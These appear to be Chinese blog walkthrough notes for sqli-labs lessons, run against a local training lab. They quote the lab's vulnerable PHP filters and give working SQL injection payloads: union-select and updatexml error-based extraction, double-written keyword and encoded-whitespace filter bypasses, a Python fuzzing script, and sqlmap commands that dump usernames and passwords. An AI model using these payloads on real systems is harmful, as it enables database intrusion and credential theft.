<p>根据图片提示，<code>or</code>和<code>and</code>被过滤了  使用<code>&#39;</code>闭合</p>
<p><code>?id=1&#39; --+</code></p>
<p><code>?id=1.99&#39; aandnd 1=1 union select 1,2,3%20 --+</code> 2,3为输出点</p>
<p>或者 <code>?id=1.99&#39; aandnd 1=1 union select 1,2,3%20 anandd &#39;1&#39;=&#39;1</code></p>
<p>虽然被过滤掉了，但可以使用双写绕过</p>
<br>

<h3 id="25a-or-and被过滤"><a href="#25a-or-and被过滤" class="headerlink" title="25a or and被过滤"></a>25a <code>or</code> <code>and</code>被过滤</h3><figure class="highlight"><table><tr><td class="code"><pre><span class="line">$<span class="keyword">sql</span><span class="operator">=</span>&quot;SELECT * FROM users WHERE id=$id LIMIT 0,1&quot;;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> blacklist($id)</span><br><span class="line">&#123;</span><br><span class="line">	$id<span class="operator">=</span> preg_replace(<span class="string">&#x27;/or/i&#x27;</span>,&quot;&quot;, $id);			<span class="operator">/</span><span class="operator">/</span>strip <span class="keyword">out</span> <span class="keyword">OR</span> (non <span class="keyword">case</span> <span class="keyword">sensitive</span>)</span><br><span class="line">	$id<span class="operator">=</span> preg_replace(<span class="string">&#x27;/AND/i&#x27;</span>,&quot;&quot;, $id);		<span class="operator">/</span><span class="operator">/</span>Strip <span class="keyword">out</span> <span class="keyword">AND</span> (non <span class="keyword">case</span> <span class="keyword">sensitive</span>)</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">return</span> $id;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<br>

<p>和25相比 少了<code>&#39;</code></p>
<p><code>?id=1 oorrder by 3</code></p>
<p><code>?id=0 union select 1,database(),3</code></p>
<br>

<h3 id="26-or-and-空格和斜杠被过滤"><a href="#26-or-and-空格和斜杠被过滤" class="headerlink" title="26 or/and/*/-/#/空格和斜杠被过滤"></a>26 <code>or/and/*/-/#/空格</code>和斜杠被过滤</h3><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">	$<span class="keyword">sql</span><span class="operator">=</span>&quot;SELECT * FROM users WHERE id=&#x27;$id&#x27; LIMIT 0,1&quot;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> blacklist($id)</span><br><span class="line">&#123;</span><br><span class="line">	$id<span class="operator">=</span> preg_replace(<span class="string">&#x27;/or/i&#x27;</span>,&quot;&quot;, $id);			<span class="operator">/</span><span class="operator">/</span>strip <span class="keyword">out</span> <span class="keyword">OR</span> (non <span class="keyword">case</span> <span class="keyword">sensitive</span>)</span><br><span class="line">	$id<span class="operator">=</span> preg_replace(<span class="string">&#x27;/and/i&#x27;</span>,&quot;&quot;, $id);		<span class="operator">/</span><span class="operator">/</span>Strip <span class="keyword">out</span> <span class="keyword">AND</span> (non <span class="keyword">case</span> <span class="keyword">sensitive</span>)</span><br><span class="line">	$id<span class="operator">=</span> preg_replace(<span class="string">&#x27;/[\/\*]/&#x27;</span>,&quot;&quot;, $id);		<span class="operator">/</span><span class="operator">/</span>strip <span class="keyword">out</span> <span class="operator">/</span> <span class="operator">*</span></span><br><span class="line">	$id<span class="operator">=</span> preg_replace(<span class="string">&#x27;/[--]/&#x27;</span>,&quot;&quot;, $id);		<span class="operator">/</span><span class="operator">/</span>Strip <span class="keyword">out</span> <span class="comment">--</span></span><br><span class="line">	$id<span class="operator">=</span> preg_replace(<span class="string">&#x27;/[#]/&#x27;</span>,&quot;&quot;, $id);			<span class="operator">/</span><span class="operator">/</span>Strip <span class="keyword">out</span> #</span><br><span class="line">	$id<span class="operator">=</span> preg_replace(<span class="string">&#x27;/[\s]/&#x27;</span>,&quot;&quot;, $id);		<span class="operator">/</span><span class="operator">/</span>Strip <span class="keyword">out</span> spaces</span><br><span class="line">	$id<span class="operator">=</span> preg_replace(<span class="string">&#x27;/[\/\\\\]/&#x27;</span>,&quot;&quot;, $id);		<span class="operator">/</span><span class="operator">/</span>Strip <span class="keyword">out</span> slashes</span><br><span class="line">	<span class="keyword">return</span> $id;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<br>

<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">changeToHex</span>(<span class="params">num</span>):</span></span><br><span class="line">    tmp = <span class="built_in">hex</span>(i).replace(<span class="string">&quot;0x&quot;</span>, <span class="string">&quot;&quot;</span>)</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(tmp)&lt;<span class="number">2</span>:</span><br><span class="line">        tmp = <span class="string">&#x27;0&#x27;</span> + tmp</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;%&quot;</span> + tmp</span><br><span class="line"></span><br><span class="line">req = requests.session()</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> xrange(<span class="number">0</span>,<span class="number">256</span>):</span><br><span class="line">    i = changeToHex(i) </span><br><span class="line">    url = <span class="string">&quot;http://localhost/sqli-labs/Less-26/?id=1&#x27;&quot;</span> + i + <span class="string">&quot;%26%26&quot;</span> + i + <span class="string">&quot;&#x27;1&#x27;=&#x27;1&quot;</span>     </span><br><span class="line">    ret = req.get(url)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;Dumb&#x27;</span> <span class="keyword">in</span> ret.content:</span><br><span class="line">        <span class="built_in">print</span> <span class="string">&quot;good,this can use:&quot;</span> + i</span><br><span class="line">        </span><br><span class="line"><span class="comment">#good,this can use:%09</span></span><br><span class="line"><span class="comment">#good,this can use:%0a</span></span><br><span class="line"><span class="comment">#good,this can use:%0b</span></span><br><span class="line"><span class="comment">#good,this can use:%0c</span></span><br><span class="line"><span class="comment">#good,this can use:%0d</span></span><br><span class="line"><span class="comment">#good,this can use:%20</span></span><br><span class="line"><span class="comment">#good,this can use:%22</span></span><br><span class="line"><span class="comment">#good,this can use:%23</span></span><br><span class="line"><span class="comment">#good,this can use:%27</span></span><br><span class="line"><span class="comment">#good,this can use:%2a</span></span><br><span class="line"><span class="comment">#good,this can use:%2d</span></span><br><span class="line"><span class="comment">#good,this can use:%2f</span></span><br><span class="line"><span class="comment">#good,this can use:%5c</span></span><br></pre></td></tr></table></figure>

<p><code>%20(空格)、%23(#)、%2a(*)、%2d(-)、%2f(/)、%5c(\)，%09-%0d都是制表符、换行符、换页符</code></p>
<p>但是这个题在linux环境下可以解析<code>%a0</code>windows下就无法解析</p>
<p>这一关有三种注入方式:</p>
<ul>
<li>union select 联合注入，用特殊编码符代替空格</li>
<li>报错注入，为了避开空格，选择使用<code>updatexml()</code>和<code>extractvalue()</code></li>
<li>Bool盲注，构造避开空格的语句</li>
</ul>
<p>使用<code>||</code>替换<code>and</code></p>
<p><code>?id=1&#39;||&#39;1&#39;=&#39;1</code></p>
<p><code>?id=0&#39;||updatexml(1,concat(0x7e,(database()),0x7e),1)||&#39;1&#39;=&#39;1</code></p>
<p><code>?id=0&#39;||updatexml(1,concat(0x7e,(select(group_concat(column_name))from(infoorrmation_schema.columns)where(table_schema=&#39;security&#39;)),0x7e),1)||&#39;1&#39;=&#39;1</code></p>
<br>

<h3 id="26a-or-and-空格和斜杠被过滤"><a href="#26a-or-and-空格和斜杠被过滤" class="headerlink" title="26a  or/and/*/-/#/空格和斜杠被过滤"></a>26a  <code>or/and/*/-/#/空格</code>和斜杠被过滤</h3><figure class="highlight"><table><tr><td class="code"><pre><span class="line">	$<span class="keyword">sql</span><span class="operator">=</span>&quot;SELECT * FROM users WHERE id=(&#x27;$id&#x27;) LIMIT 0,1&quot;;</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">function</span> blacklist($id)</span><br><span class="line">&#123;</span><br><span class="line">	$id<span class="operator">=</span> preg_replace(<span class="string">&#x27;/or/i&#x27;</span>,&quot;&quot;, $id);			<span class="operator">/</span><span class="operator">/</span>strip <span class="keyword">out</span> <span class="keyword">OR</span> (non <span class="keyword">case</span> <span class="keyword">sensitive</span>)</span><br><span class="line">	$id<span class="operator">=</span> preg_replace(<span class="string">&#x27;/and/i&#x27;</span>,&quot;&quot;, $id);		<span class="operator">/</span><span class="operator">/</span>Strip <span class="keyword">out</span> <span class="keyword">AND</span> (non <span class="keyword">case</span> <span class="keyword">sensitive</span>)</span><br><span class="line">	$id<span class="operator">=</span> preg_replace(<span class="string">&#x27;/[\/\*]/&#x27;</span>,&quot;&quot;, $id);		<span class="operator">/</span><span class="operator">/</span>strip <span class="keyword">out</span> <span class="operator">/</span> <span class="operator">*</span></span><br><span class="line">	$id<span class="operator">=</span> preg_replace(<span class="string">&#x27;/[--]/&#x27;</span>,&quot;&quot;, $id);		<span class="operator">/</span><span class="operator">/</span>Strip <span class="keyword">out</span> <span class="comment">--</span></span><br><span class="line">	$id<span class="operator">=</span> preg_replace(<span class="string">&#x27;/[#]/&#x27;</span>,&quot;&quot;, $id);			<span class="operator">/</span><span class="operator">/</span>Strip <span class="keyword">out</span> #</span><br><span class="line">	$id<span class="operator">=</span> preg_replace(<span class="string">&#x27;/[\s]/&#x27;</span>,&quot;&quot;, $id);		<span class="operator">/</span><span class="operator">/</span>Strip <span class="keyword">out</span> spaces</span><br><span class="line">	$id<span class="operator">=</span> preg_replace(<span class="string">&#x27;/[\s]/&#x27;</span>,&quot;&quot;, $id);		<span class="operator">/</span><span class="operator">/</span>Strip <span class="keyword">out</span> spaces</span><br><span class="line">	$id<span class="operator">=</span> preg_replace(<span class="string">&#x27;/[\/\\\\]/&#x27;</span>,&quot;&quot;, $id);		<span class="operator">/</span><span class="operator">/</span>Strip <span class="keyword">out</span> slashes</span><br><span class="line">	<span class="keyword">return</span> $id;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><code>?id=1&#39;)||(&#39;1&#39;=&#39;1</code></p>
<br>

<br>

<h3 id="27-空格-union-select被过滤"><a href="#27-空格-union-select被过滤" class="headerlink" title="27 */-/#/空格/*/union/select被过滤"></a>27 <code>*/-/#/空格/*/union/select</code>被过滤</h3><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">	$<span class="keyword">sql</span><span class="operator">=</span>&quot;SELECT * FROM users WHERE id=&#x27;$id&#x27; LIMIT 0,1&quot;;</span><br><span class="line">	</span><br><span class="line"><span class="keyword">function</span> blacklist($id)</span><br><span class="line">&#123;</span><br><span class="line">$id<span class="operator">=</span> preg_replace(<span class="string">&#x27;/[\/\*]/&#x27;</span>,&quot;&quot;, $id);		<span class="operator">/</span><span class="operator">/</span>strip <span class="keyword">out</span> <span class="operator">/</span> <span class="operator">*</span></span><br><span class="line">$id<span class="operator">=</span> preg_replace(<span class="string">&#x27;/[--]/&#x27;</span>,&quot;&quot;, $id);		<span class="operator">/</span><span class="operator">/</span>Strip <span class="keyword">out</span> <span class="comment">--.</span></span><br><span class="line">$id<span class="operator">=</span> preg_replace(<span class="string">&#x27;/[#]/&#x27;</span>,&quot;&quot;, $id);			<span class="operator">/</span><span class="operator">/</span>Strip <span class="keyword">out</span> #.</span><br><span class="line">$id<span class="operator">=</span> preg_replace(<span class="string">&#x27;/[ +]/&#x27;</span>,&quot;&quot;, $id);	    <span class="operator">/</span><span class="operator">/</span>Strip <span class="keyword">out</span> spaces.</span><br><span class="line">$id<span class="operator">=</span> preg_replace(<span class="string">&#x27;/select/m&#x27;</span>,&quot;&quot;, $id);	    <span class="operator">/</span><span class="operator">/</span>Strip <span class="keyword">out</span> spaces.</span><br><span class="line">$id<span class="operator">=</span> preg_replace(<span class="string">&#x27;/[ +]/&#x27;</span>,&quot;&quot;, $id);	    <span class="operator">/</span><span class="operator">/</span>Strip <span class="keyword">out</span> spaces.</span><br><span class="line">$id<span class="operator">=</span> preg_replace(<span class="string">&#x27;/union/s&#x27;</span>,&quot;&quot;, $id);	    <span class="operator">/</span><span class="operator">/</span>Strip <span class="keyword">out</span> <span class="keyword">union</span></span><br><span class="line">$id<span class="operator">=</span> preg_replace(<span class="string">&#x27;/select/s&#x27;</span>,&quot;&quot;, $id);	    <span class="operator">/</span><span class="operator">/</span>Strip <span class="keyword">out</span> <span class="keyword">select</span></span><br><span class="line">$id<span class="operator">=</span> preg_replace(<span class="string">&#x27;/UNION/s&#x27;</span>,&quot;&quot;, $id);	    <span class="operator">/</span><span class="operator">/</span>Strip <span class="keyword">out</span> <span class="keyword">UNION</span></span><br><span class="line">$id<span class="operator">=</span> preg_replace(<span class="string">&#x27;/SELECT/s&#x27;</span>,&quot;&quot;, $id);	    <span class="operator">/</span><span class="operator">/</span>Strip <span class="keyword">out</span> <span class="keyword">SELECT</span></span><br><span class="line">$id<span class="operator">=</span> preg_replace(<span class="string">&#x27;/Union/s&#x27;</span>,&quot;&quot;, $id);	    <span class="operator">/</span><span class="operator">/</span>Strip <span class="keyword">out</span> <span class="keyword">Union</span></span><br><span class="line">$id<span class="operator">=</span> preg_replace(<span class="string">&#x27;/Select/s&#x27;</span>,&quot;&quot;, $id);	    <span class="operator">/</span><span class="operator">/</span>Strip <span class="keyword">out</span> <span class="keyword">select</span></span><br><span class="line"><span class="keyword">return</span> $id;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><code>?id=0%27%a0unIon%a0sElect%a01,2,%273</code></p>
<p><code>?id=0%27%a0unIon%a0sElect%a01,(sElect%a0group_concat(password)from%a0users)%20,%273</code></p>
<br>

<br>

<h3 id="27a-空格-union-select被过滤"><a href="#27a-空格-union-select被过滤" class="headerlink" title="27a */-/#/空格/*/union/select被过滤"></a>27a <code>*/-/#/空格/*/union/select</code>被过滤</h3><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">	$<span class="keyword">sql</span><span class="operator">=</span>&quot;SELECT * FROM users WHERE id=$id LIMIT 0,1&quot;;</span><br><span class="line">	</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">function</span> blacklist($id)</span><br><span class="line">&#123;</span><br><span class="line">$id<span class="operator">=</span> preg_replace(<span class="string">&#x27;/[\/\*]/&#x27;</span>,&quot;&quot;, $id);		<span class="operator">/</span><span class="operator">/</span>strip <span class="keyword">out</span> <span class="operator">/</span> <span class="operator">*</span></span><br><span class="line">$id<span class="operator">=</span> preg_replace(<span class="string">&#x27;/[--]/&#x27;</span>,&quot;&quot;, $id);		<span class="operator">/</span><span class="operator">/</span>Strip <span class="keyword">out</span> <span class="comment">--.</span></span><br><span class="line">$id<span class="operator">=</span> preg_replace(<span class="string">&#x27;/[#]/&#x27;</span>,&quot;&quot;, $id);			<span class="operator">/</span><span class="operator">/</span>Strip <span class="keyword">out</span> #.</span><br><span class="line">$id<span class="operator">=</span> preg_replace(<span class="string">&#x27;/[ +]/&#x27;</span>,&quot;&quot;, $id);	    <span class="operator">/</span><span class="operator">/</span>Strip <span class="keyword">out</span> spaces.</span><br><span class="line">$id<span class="operator">=</span> preg_replace(<span class="string">&#x27;/select/m&#x27;</span>,&quot;&quot;, $id);	    <span class="operator">/</span><span class="operator">/</span>Strip <span class="keyword">out</span> spaces.</span><br><span class="line">$id<span class="operator">=</span> preg_replace(<span class="string">&#x27;/[ +]/&#x27;</span>,&quot;&quot;, $id);	    <span class="operator">/</span><span class="operator">/</span>Strip <span class="keyword">out</span> spaces.</span><br><span class="line">$id<span class="operator">=</span> preg_replace(<span class="string">&#x27;/union/s&#x27;</span>,&quot;&quot;, $id);	    <span class="operator">/</span><span class="operator">/</span>Strip <span class="keyword">out</span> <span class="keyword">union</span></span><br><span class="line">$id<span class="operator">=</span> preg_replace(<span class="string">&#x27;/select/s&#x27;</span>,&quot;&quot;, $id);	    <span class="operator">/</span><span class="operator">/</span>Strip <span class="keyword">out</span> <span class="keyword">select</span></span><br><span class="line">$id<span class="operator">=</span> preg_replace(<span class="string">&#x27;/UNION/s&#x27;</span>,&quot;&quot;, $id);	    <span class="operator">/</span><span class="operator">/</span>Strip <span class="keyword">out</span> <span class="keyword">UNION</span></span><br><span class="line">$id<span class="operator">=</span> preg_replace(<span class="string">&#x27;/SELECT/s&#x27;</span>,&quot;&quot;, $id);	    <span class="operator">/</span><span class="operator">/</span>Strip <span class="keyword">out</span> <span class="keyword">SELECT</span></span><br><span class="line">$id<span class="operator">=</span> preg_replace(<span class="string">&#x27;/Union/s&#x27;</span>,&quot;&quot;, $id);	    <span class="operator">/</span><span class="operator">/</span>Strip <span class="keyword">out</span> <span class="keyword">Union</span></span><br><span class="line">$id<span class="operator">=</span> preg_replace(<span class="string">&#x27;/Select/s&#x27;</span>,&quot;&quot;, $id);	    <span class="operator">/</span><span class="operator">/</span>Strip <span class="keyword">out</span> <span class="keyword">Select</span></span><br><span class="line"><span class="keyword">return</span> $id;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><code>?id=1&quot; ||&quot;1&quot;=&quot;1</code> 双引号闭合</p>
<p><code>?id=0%22%20UnIon%a0SeLect%a01,2,3%22</code></p>
<p><code>?id=0%22%20UnIon%a0SeLect%a01,(SeLect%a0group_concat(password)from%a0users),3%22</code></p>
<br>

<h3 id="28-空格-union-select被过滤"><a href="#28-空格-union-select被过滤" class="headerlink" title="28*/-/#/+/空格/union/select被过滤"></a>28<code>*/-/#/+/空格/union/select</code>被过滤</h3><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">	$<span class="keyword">sql</span><span class="operator">=</span>&quot;SELECT * FROM users WHERE id=(&#x27;$id&#x27;) LIMIT 0,1&quot;;</span><br><span class="line">	</span><br><span class="line">	</span><br><span class="line"><span class="keyword">function</span> blacklist($id)</span><br><span class="line">&#123;</span><br><span class="line">$id<span class="operator">=</span> preg_replace(<span class="string">&#x27;/[\/\*]/&#x27;</span>,&quot;&quot;, $id);				<span class="operator">/</span><span class="operator">/</span>strip <span class="keyword">out</span> <span class="operator">/</span> <span class="operator">*</span></span><br><span class="line">$id<span class="operator">=</span> preg_replace(<span class="string">&#x27;/[--]/&#x27;</span>,&quot;&quot;, $id);				<span class="operator">/</span><span class="operator">/</span>Strip <span class="keyword">out</span> <span class="comment">--.</span></span><br><span class="line">$id<span class="operator">=</span> preg_replace(<span class="string">&#x27;/[#]/&#x27;</span>,&quot;&quot;, $id);					<span class="operator">/</span><span class="operator">/</span>Strip <span class="keyword">out</span> #.</span><br><span class="line">$id<span class="operator">=</span> preg_replace(<span class="string">&#x27;/[ +]/&#x27;</span>,&quot;&quot;, $id);	    		<span class="operator">/</span><span class="operator">/</span>Strip <span class="keyword">out</span> spaces.</span><br><span class="line"><span class="operator">/</span><span class="operator">/</span>$id<span class="operator">=</span> preg_replace(<span class="string">&#x27;/select/m&#x27;</span>,&quot;&quot;, $id);	   		 	<span class="operator">/</span><span class="operator">/</span>Strip <span class="keyword">out</span> spaces.</span><br><span class="line">$id<span class="operator">=</span> preg_replace(<span class="string">&#x27;/[ +]/&#x27;</span>,&quot;&quot;, $id);	    		<span class="operator">/</span><span class="operator">/</span>Strip <span class="keyword">out</span> spaces.</span><br><span class="line">$id<span class="operator">=</span> preg_replace(<span class="string">&#x27;/union\s+select/i&#x27;</span>,&quot;&quot;, $id);	    <span class="operator">/</span><span class="operator">/</span>Strip <span class="keyword">out</span> <span class="keyword">UNION</span> <span class="operator">&amp;</span> SELECT.</span><br><span class="line"><span class="keyword">return</span> $id;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">	</span><br></pre></td></tr></table></figure>

<p><code>id=0%27)%a0UnIon%a0SEleCt%a01,2,(%273</code></p>
<br>

<h3 id="28a-空格-union-select被过滤"><a href="#28a-空格-union-select被过滤" class="headerlink" title="28a */-/#/+/空格/union/select被过滤"></a>28a <code>*/-/#/+/空格/union/select</code>被过滤</h3><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">	$<span class="keyword">sql</span><span class="operator">=</span>&quot;SELECT * FROM users WHERE id=(&#x27;$id&#x27;) LIMIT 0,1&quot;;</span><br><span class="line">	</span><br><span class="line">	</span><br><span class="line"><span class="keyword">function</span> blacklist($id)</span><br><span class="line">&#123;</span><br><span class="line"><span class="operator">/</span><span class="operator">/</span>$id<span class="operator">=</span> preg_replace(<span class="string">&#x27;/[\/\*]/&#x27;</span>,&quot;&quot;, $id);				<span class="operator">/</span><span class="operator">/</span>strip <span class="keyword">out</span> <span class="operator">/</span> <span class="operator">*</span></span><br><span class="line"><span class="operator">/</span><span class="operator">/</span>$id<span class="operator">=</span> preg_replace(<span class="string">&#x27;/[--]/&#x27;</span>,&quot;&quot;, $id);				<span class="operator">/</span><span class="operator">/</span>Strip <span class="keyword">out</span> <span class="comment">--.</span></span><br><span class="line"><span class="operator">/</span><span class="operator">/</span>$id<span class="operator">=</span> preg_replace(<span class="string">&#x27;/[#]/&#x27;</span>,&quot;&quot;, $id);					<span class="operator">/</span><span class="operator">/</span>Strip <span class="keyword">out</span> #.</span><br><span class="line"><span class="operator">/</span><span class="operator">/</span>$id<span class="operator">=</span> preg_replace(<span class="string">&#x27;/[ +]/&#x27;</span>,&quot;&quot;, $id);	    		<span class="operator">/</span><span class="operator">/</span>Strip <span class="keyword">out</span> spaces.</span><br><span class="line"><span class="operator">/</span><span class="operator">/</span>$id<span class="operator">=</span> preg_replace(<span class="string">&#x27;/select/m&#x27;</span>,&quot;&quot;, $id);	   		 	<span class="operator">/</span><span class="operator">/</span>Strip <span class="keyword">out</span> spaces.</span><br><span class="line"><span class="operator">/</span><span class="operator">/</span>$id<span class="operator">=</span> preg_replace(<span class="string">&#x27;/[ +]/&#x27;</span>,&quot;&quot;, $id);	    		<span class="operator">/</span><span class="operator">/</span>Strip <span class="keyword">out</span> spaces.</span><br><span class="line">$id<span class="operator">=</span> preg_replace(<span class="string">&#x27;/union\s+select/i&#x27;</span>,&quot;&quot;, $id);	    <span class="operator">/</span><span class="operator">/</span>Strip <span class="keyword">out</span> spaces.</span><br><span class="line"><span class="keyword">return</span> $id;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><code>id=0%27)%a0UnIon%a0SEleCt%a01,2,(%273</code></p>
]]></content>
      <categories>
        <category>SQLi</category>
      </categories>
      <tags>
        <tag>SQLi</tag>
      </tags>
  </entry>
  <entry>
    <title>sqli-labs1</title>
    <url>/posts/2b9109b5/</url>
    <content><![CDATA[<p><code>union select 1,2,table_name from information_schema.tables where table_schema = database() limit 0,1 </code>查字段</p>
<p><code>union select 1,2,column_name from information_schema.columns where table_schema=database() and table_name=&#39;表名&#39; limit 0,1</code></p>
<h3 id="1"><a href="#1" class="headerlink" title="1."></a>1.</h3><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">$<span class="keyword">sql</span><span class="operator">=</span>&quot;SELECT * FROM users WHERE id=&#x27;$id&#x27; LIMIT 0,1&quot;;</span><br></pre></td></tr></table></figure>

<p>用<code>&#39;</code>闭合</p>
<p><code>id = 1&#39; --+</code></p>
<p><code>id =1&#39; order by 4 --+</code> #报错 说明有三个字段</p>
<p><code>id = 1.9999&#39; and union select 1,2,3  --+ </code>  2,3是输出点</p>
<p><code>id=1.9999&#39; and union select 1,2,table_name from information_schema.tables where table_schema=database() limit 0,1 --+</code>查表名</p>
<p><code>id=-1&#39; union select 1,2,column_name from information_schema.columns where table_schema=database() and table_name=&#39;users&#39; limit 1,1--+</code> 查字段</p>
<p><code>?id=-1&#39; union select 1,username,password from users limit 1,1--+</code> 查账号密码</p>
<p>SQLmap</p>
<p><code>python sqlmap.py -u &quot;http://127.0.0.1/sqli-labs/Less-1/?id=1&quot; --dbs --batch --tables</code></p>
<p>加了<code>--batch</code> sqlmap不会询问你输入 全部默认确定</p>
<h3 id="2"><a href="#2" class="headerlink" title="2."></a>2.</h3><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">$<span class="keyword">sql</span><span class="operator">=</span>&quot;SELECT * FROM users WHERE id=$id LIMIT 0,1&quot;;</span><br></pre></td></tr></table></figure>

<br>

<p><code>id=1 and 1=1 union select 1,2, table_name from information_schema.tables where table_schema=database() limit 1,1 --+</code> 查表名</p>
<p><code>id=1 and 1=1 union select 1,2,column_name from information_schema.columns where table_schema=database() and table_name=&#39;users&#39; limit 0,1--+</code> 查字段</p>
<br>

<p>SQLmap</p>
<p><code>python sqlmap.py -u &quot;http://127.0.0.1/sqli-labs/Less-2/?id=1&quot; --dbs --batch --tables</code></p>
<br>

<br>

<h3 id="3"><a href="#3" class="headerlink" title="3."></a>3.</h3><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">$<span class="keyword">sql</span><span class="operator">=</span>&quot;SELECT * FROM users WHERE id=(&#x27;$id&#x27;) LIMIT 0,1&quot;;</span><br></pre></td></tr></table></figure>

<p>用<code>&#39;)</code>闭合</p>
<p><code>id=1&#39;) and 1=1 --+</code></p>
<p><code>id=1.999&#39;)  and 1=1 union select 1,2,table_name from information_schema.tables where table_schema=database() limit 1,1 --+</code></p>
<p><code>id=1.999&#39;)  and 1=1 union select 1,2,column_name from information_schema.columns where table_schema=database() and table_name=&#39;users&#39; limit 0,1 --+</code></p>
<p>SQLmap</p>
<p><code>python sqlmap.py -u &quot;http://127.0.0.1/sqli-labs/Less-3/?id=1&quot; --dbs --batch</code></p>
<br>

<h3 id="4"><a href="#4" class="headerlink" title="4."></a>4.</h3><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">$<span class="keyword">sql</span><span class="operator">=</span>&quot;SELECT * FROM users WHERE id=($id) LIMIT 0,1&quot;;</span><br></pre></td></tr></table></figure>

<p>用<code>&quot;)</code>闭合</p>
<p>SQLmap</p>
<p><code>python sqlmap.py -u &quot;http://127.0.0.1/sqli-labs/Less-4/?id=1&quot; --dbs --batch</code></p>
<br>

<h3 id="5-报错注入"><a href="#5-报错注入" class="headerlink" title="5.报错注入"></a>5.报错注入</h3><figure class="highlight"><table><tr><td class="code"><pre><span class="line">$<span class="keyword">sql</span><span class="operator">=</span>&quot;SELECT * FROM users WHERE id=&#x27;$id&#x27; LIMIT 0,1&quot;;</span><br><span class="line">$<span class="keyword">result</span><span class="operator">=</span>mysql_query($<span class="keyword">sql</span>);</span><br><span class="line">$<span class="type">row</span> <span class="operator">=</span> mysql_fetch_array($<span class="keyword">result</span>);</span><br><span class="line"></span><br><span class="line">	if($<span class="type">row</span>)</span><br><span class="line">	&#123;</span><br><span class="line">  	echo <span class="string">&#x27;&lt;font size=&quot;5&quot; color=&quot;#FFFF00&quot;&gt;&#x27;</span>;	</span><br><span class="line">  	echo <span class="string">&#x27;You are in...........&#x27;</span>;</span><br><span class="line">  	echo &quot;&lt;br&gt;&quot;;</span><br><span class="line">    	echo &quot;&lt;/font&gt;&quot;;</span><br><span class="line">  	&#125;</span><br><span class="line">	<span class="keyword">else</span> </span><br><span class="line">	&#123;</span><br><span class="line">	</span><br><span class="line">	echo <span class="string">&#x27;&lt;font size=&quot;3&quot; color=&quot;#FFFF00&quot;&gt;&#x27;</span>;</span><br><span class="line">	print_r(mysql_error());</span><br><span class="line">	echo &quot;&lt;/br&gt;&lt;/font&gt;&quot;;	</span><br><span class="line">	echo <span class="string">&#x27;&lt;font color= &quot;#0000ff&quot; font size= 3&gt;&#x27;</span>;	</span><br><span class="line">	</span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure>

<p><code>id=1&#39; --+</code>页面正常 说明用 <code>&#39;</code>闭合</p>
<p><code>id=1&#39;  and 1=1 --+</code> 有回显</p>
<p><code>id=1&#39;  and 1=2 --+</code>无回显</p>
<p>查看代码，发现只要语句执行成功就会返回’You are in ……..’</p>
<p>可以考虑使用报错注入或者布尔盲注</p>
<p>报错注入使用<code>updatexml</code></p>
<p><code>id=1&#39;  and updatexml(1,concat(0x7e,(select concat_ws(&#39;:&#39;,database(),version(),user()))),1)--+</code>==&gt; <code>XPATH syntax error: &#39;~security:5.7.26:root@localhost&#39;</code>得到数据库等信息</p>
<p><code>id=1&#39; and updatexml(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=&#39;security&#39; ),0x7e),1)--+</code>得到表名==&gt; <code>XPATH syntax error: &#39;~emails,referers,uagents,users~&#39;</code></p>
<p><code>id=1&#39; and updatexml(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_schema=&#39;security&#39; and table_name=&#39;users&#39;),0x7e),1)--+</code>得到字段名==&gt;<code> XPATH syntax error: &#39;~id,username,password~&#39;</code></p>
<p><code>id=1&#39; and updatexml(1,concat(0x7e,(select username from users limit 0,1),0x7e),1)--+</code>查账号密码</p>
<br>

<p>SQLmap</p>
<p><code>python sqlmap.py -u &quot;http://127.0.0.1/sqli-labs/Less-5/?id=1&quot;</code>  #判断是否存在注入</p>
<p><code>python sqlmap.py -u &quot;http://127.0.0.1/sqli-labs/Less-5/?id=1&quot;  --dbs</code>   #获取数据库信息</p>
<p><code>python sqlmap.py -u &quot;http://127.0.0.1/sqli-labs/Less-5/?id=1&quot;  -D security --tables</code> #获取表名</p>
<p><code>python sqlmap.py -u &quot;http://127.0.0.1/sqli-labs/Less-5/?id=1&quot;  -D security -T users --columns</code>#获取字段名</p>
<p><code>python sqlmap.py -u &quot;http://127.0.0.1/sqli-labs/Less-5/?id=1&quot;  -D security -T users -C username,password --dump</code> #获取账号密码</p>
<br>

<br>

